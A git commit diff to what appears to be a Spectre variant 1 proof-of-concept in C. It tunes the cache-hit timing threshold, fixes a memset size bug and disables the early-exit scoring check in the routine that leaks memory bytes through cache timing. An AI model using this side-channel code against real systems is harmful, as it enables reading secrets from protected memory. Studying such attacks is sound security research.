7261eef1190fc63fe713fb17679e294c2ee017ce
yellowday60 <yellowday60@naver.com>
2023-02-10 14:34:55 +0900

    fix memset bug

--- variant1.c
+++ variant1.c
@@ -33,7 +33,7 @@ void victim_function(size_t x) {
 /********************************************************************
 Analysis code
 ********************************************************************/
-#define CACHE_HIT_THRESHOLD (80)  /* assume cache hit if time <= threshold */
+#define CACHE_HIT_THRESHOLD (60)  /* assume cache hit if time <= threshold */
 
 /* Report best guess in value[0] and runner-up in value[1] */
 void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
@@ -43,7 +43,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 	register uint64_t time1, time2;
 	volatile uint8_t *addr;
 
-	memset(results, 0, 256);
+	memset(results, 0, 256 * sizeof(int));
 
 	for (tries = 999; tries > 0; tries--) {
 		/* Flush array2[UNIT*(0..255)] from cache */
@@ -72,7 +72,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 			mix_i = ((i * 167) + 13) & 255;		//Shuffle i
 			addr = &array2[mix_i * UNIT];
 			time1 = __rdtscp(&junk);            /* READ Timestamp */
-			junk = array2[mix_i * UNIT];
+			junk = *addr;
 			time2 = __rdtscp(&junk) - time1;    /* READ Timestamp & COMPUTE ELAPSED TIME */
 			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size])
 				results[mix_i]++;  /* cache hit - add +1 to score for this value */
@@ -88,8 +88,8 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
 				k = i;
 			}
 		}
-		if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
-			break;  /* Clear success if best is > 2*runner-up + 5 or 2/0) */
+		// if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
+		// 	break;  /* Clear success if best is > 2*runner-up + 5 or 2/0) */
 	}
 	results[0] ^= junk;  /* use junk so code above won't get optimized out*/
 	value[0] = (uint8_t)j;
@@ -115,12 +115,12 @@ int main(int argc, const char **argv) {
 	while (--len >= 0) {
 		printf("Reading at malicious_x = %p... ", (void*)malicious_x);
 		readMemoryByte(malicious_x++, value, score);
-		printf("%s: ", (score[0] >= 2*score[1] ? "Gotcha!": "Hmm..?"));
+		printf("%s: ", (score[0] >= 2*score[1] ? "Gotcha!": "Hmm...?"));
 		printf("0x%02X='%c' score=%d    ", value[0],  (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
 		if (score[1] > 0)
 			printf("(second best: 0x%02X score=%d)", value[1], score[1]);
 		printf("\n");
 	}
-	
+
 	return 0;
 }
